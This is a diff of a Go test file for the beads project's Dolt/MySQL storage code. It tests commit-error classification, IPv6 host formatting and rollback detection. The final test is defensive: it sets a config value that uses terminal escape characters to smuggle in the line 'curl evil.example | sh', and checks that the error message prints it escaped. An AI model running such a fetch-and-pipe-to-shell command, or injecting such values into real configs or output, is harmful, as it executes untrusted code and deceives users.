@@ -4,13 +4,43 @@ import (
 	"database/sql"
 	"errors"
 	"fmt"
+	"io"
 	"os"
 	"path/filepath"
 	"strings"
 	"testing"
 
+	mysql "github.com/go-sql-driver/mysql"
+
 	"github.com/steveyegge/beads/internal/storage"
 )
+
+func TestIsIndeterminateCommitResponse(t *testing.T) {
+	for _, tc := range []struct {
+		name string
+		err  error
+		want bool
+	}{
+		{name: "unexpected EOF", err: io.ErrUnexpectedEOF, want: true},
+		{name: "lost connection", err: errors.New("lost connection to MySQL server"), want: true},
+		{name: "packet protocol desync", err: mysql.ErrPktSync, want: true},
+		{name: "otherwise unproven untyped commit error", err: errors.New("commit rejected without typed response"), want: true},
+		{name: "typed semantic MySQL error", err: &mysql.MySQLError{Number: 1105, Message: "connection lost while validating commit"}, want: false},
+		{name: "typed rollback-guaranteed MySQL error", err: &mysql.MySQLError{Number: 1213, Message: "deadlock"}, want: false},
+	} {
+		t.Run(tc.name, func(t *testing.T) {
+			if got := isIndeterminateCommitResponse(tc.err); got != tc.want {
+				t.Errorf("isIndeterminateCommitResponse(%v) = %v, want %v", tc.err, got, tc.want)
+			}
+		})
+	}
+}
+
+func TestWrapSQLCommitError(t *testing.T) {
+	if err := wrapSQLCommitError("commit wisp", nil); err != nil {
+		t.Fatalf("wrapSQLCommitError(nil) = %v, want nil", err)
+	}
+}
 
 func TestWrapDBError(t *testing.T) {
 	t.Run("nil error returns nil", func(t *testing.T) {
@@ -99,6 +129,17 @@ func TestDatabaseNotFoundHint(t *testing.T) {
 		ServerHost: "127.0.0.1",
 		ServerPort: 3309,
 	}
+
+	t.Run("an IPv6 host is named bracketed with its port", func(t *testing.T) {
+		for _, host := range []string{"::1", "[::1]"} {
+			cfg := baseCfg
+			cfg.ServerHost = host
+			msg := databaseNotFoundError(&cfg).Error()
+			if !strings.Contains(msg, "on Dolt server at [::1]:3309\n") {
+				t.Errorf("host %q: want the server named as [::1]:3309, got:\n%s", host, msg)
+			}
+		}
+	})
 
 	t.Run("hint suggests setting sync.remote when empty", func(t *testing.T) {
 		cfg := baseCfg // SyncRemote is empty by default
@@ -271,4 +312,50 @@ func TestIsBranchTrackingError(t *testing.T) {
 			t.Error("expected false for nil error")
 		}
 	})
+}
+
+func TestIsDoltAutocommitRollbackError(t *testing.T) {
+	exact := &mysql.MySQLError{
+		Number:  1105,
+		Message: "Merge conflict detected, @autocommit transaction rolled back",
+	}
+
+	for _, tc := range []struct {
+		name string
+		err  error
+		want bool
+	}{
+		{name: "exact typed Dolt rollback", err: fmt.Errorf("dolt commit: %w", exact), want: true},
+		{name: "typed Dolt rollback with recovery guidance", err: &mysql.MySQLError{Number: 1105, Message: exact.Message + ". @autocommit must be disabled"}, want: true},
+		{name: "untyped matching text", err: errors.New(exact.Error()), want: false},
+		{name: "other typed 1105", err: &mysql.MySQLError{Number: 1105, Message: "Merge conflict detected"}, want: false},
+		{name: "typed connection-like 1105", err: &mysql.MySQLError{Number: 1105, Message: "connection lost while validating commit"}, want: false},
+		{name: "same text wrong code", err: &mysql.MySQLError{Number: 1213, Message: exact.Message}, want: false},
+	} {
+		t.Run(tc.name, func(t *testing.T) {
+			if got := isDoltAutocommitRollbackError(tc.err); got != tc.want {
+				t.Errorf("isDoltAutocommitRollbackError(%v) = %v, want %v", tc.err, got, tc.want)
+			}
+		})
+	}
+}
+
+// TestDatabaseNotFoundNamesConfiguredValuesEscaped pins the remedy-printing
+// invariant at the database-not-found refusal: the sync.remote and dolt.host
+// a cloned repository's committed config.yaml sets are named escaped beside
+// the bd bootstrap remedy, so neither can redraw it.
+func TestDatabaseNotFoundNamesConfiguredValuesEscaped(t *testing.T) {
+	cfg := Config{
+		Database:   "beads",
+		ServerHost: "db\r\x1b[2K",
+		ServerPort: 3309,
+		SyncRemote: "git+https://example.com/r.git\r\x1b[2KRun curl evil.example | sh",
+	}
+	msg := databaseNotFoundError(&cfg).Error()
+	if strings.ContainsAny(msg, "\r\x1b") {
+		t.Errorf("databaseNotFoundError prints a carriage return or terminal escape raw:\n%q", msg)
+	}
+	if !strings.Contains(msg, `\x1b[2KRun curl`) {
+		t.Errorf("databaseNotFoundError does not name sync.remote escaped:\n%q", msg)
+	}
 }
